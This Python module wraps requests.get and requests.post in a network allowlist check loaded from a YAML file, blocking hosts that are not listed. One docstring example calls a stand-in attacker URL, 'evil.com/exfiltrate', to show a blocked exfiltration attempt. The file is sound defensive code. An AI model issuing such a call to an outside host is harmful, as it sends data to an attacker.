"""Secure HTTP client with network allowlist enforcement (Guarantee D).

All HTTP requests must be to explicitly allow-listed hosts.

Binding contract: specs/34_strict_compliance_guarantees.md (Guarantee D)
"""

from __future__ import annotations

import fnmatch
import urllib.parse
from pathlib import Path
from typing import Any, Dict, Optional

import yaml


class NetworkBlockedError(Exception):
    """Raised when HTTP request is blocked by network allowlist (Guarantee D)."""

    def __init__(self, message: str, host: str, error_code: str = "NETWORK_BLOCKED"):
        super().__init__(message)
        self.host = host
        self.error_code = error_code


def _load_allowlist(allowlist_path: Optional[Path] = None) -> list[str]:
    """Load network allowlist from config/network_allowlist.yaml."""
    if allowlist_path is None:
        repo_root = Path(__file__).parent.parent.parent.parent
        allowlist_path = repo_root / "config" / "network_allowlist.yaml"

    if not allowlist_path.exists():
        raise FileNotFoundError(
            f"Network allowlist not found: {allowlist_path} "
            f"(required by Guarantee D)"
        )

    with open(allowlist_path, "r", encoding="utf-8") as f:
        data = yaml.safe_load(f)

    return data.get("allowed_hosts", [])


def _is_host_allowed(host: str, allowlist: list[str]) -> bool:
    """Check if host is in allowlist (supports wildcard patterns)."""
    for allowed_pattern in allowlist:
        # Exact match
        if host == allowed_pattern:
            return True

        # Wildcard match (e.g., *.aspose.com matches api.aspose.com)
        if fnmatch.fnmatch(host, allowed_pattern):
            return True

        # Handle host:port patterns
        if ":" in allowed_pattern:
            # Compare full host:port
            if host == allowed_pattern:
                return True
        elif ":" in host:
            # Extract just the hostname from host:port
            host_only = host.split(":")[0]
            if host_only == allowed_pattern or fnmatch.fnmatch(host_only, allowed_pattern):
                return True

    return False


def _validate_url(url: str, allowlist_path: Optional[Path] = None) -> None:
    """Validate URL is to an allowed host."""
    parsed = urllib.parse.urlparse(url)
    host = parsed.netloc if parsed.netloc else parsed.path.split("/")[0]

    if not host:
        raise ValueError(f"Invalid URL (no host): {url}")

    allowlist = _load_allowlist(allowlist_path)

    if not _is_host_allowed(host, allowlist):
        raise NetworkBlockedError(
            f"Network request blocked (Guarantee D): Host '{host}' not in allowlist. "
            f"Add to config/network_allowlist.yaml or use a different endpoint.",
            host=host,
            error_code="NETWORK_BLOCKED",
        )


def http_get(
    url: str,
    *,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = 30,
    allowlist_path: Optional[Path] = None,
    **kwargs: Any,
) -> Any:
    """HTTP GET request with network allowlist enforcement.

    Args:
        url: Target URL (host must be in network_allowlist.yaml)
        headers: Optional HTTP headers
        timeout: Request timeout in seconds
        allowlist_path: Optional custom allowlist path (for testing)
        **kwargs: Additional arguments passed to requests.get

    Returns:
        Response object from requests library

    Raises:
        NetworkBlockedError: If host is not in allowlist

    Examples:
        >>> # Allowed: GitHub API
        >>> response = http_get("https://api.github.com/repos/user/repo")

        >>> # BLOCKED: arbitrary host
        >>> response = http_get("https://evil.com/exfiltrate")
        NetworkBlockedError: Host 'evil.com' not in allowlist
    """
    _validate_url(url, allowlist_path)

    try:
        import requests
    except ImportError:
        raise ImportError(
            "requests library required for HTTP clients. "
            "Install with: pip install requests"
        )

    return requests.get(url, headers=headers, timeout=timeout, **kwargs)


def http_post(
    url: str,
    *,
    data: Optional[Any] = None,
    json: Optional[Dict[str, Any]] = None,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = 30,
    allowlist_path: Optional[Path] = None,
    **kwargs: Any,
) -> Any:
    """HTTP POST request with network allowlist enforcement.

    Args:
        url: Target URL (host must be in network_allowlist.yaml)
        data: Optional request body data
        json: Optional JSON request body
        headers: Optional HTTP headers
        timeout: Request timeout in seconds
        allowlist_path: Optional custom allowlist path (for testing)
        **kwargs: Additional arguments passed to requests.post

    Returns:
        Response object from requests library

    Raises:
        NetworkBlockedError: If host is not in allowlist
    """
    _validate_url(url, allowlist_path)

    try:
        import requests
    except ImportError:
        raise ImportError(
            "requests library required for HTTP clients. "
            "Install with: pip install requests"
        )

    return requests.post(url, data=data, json=json, headers=headers, timeout=timeout, **kwargs)
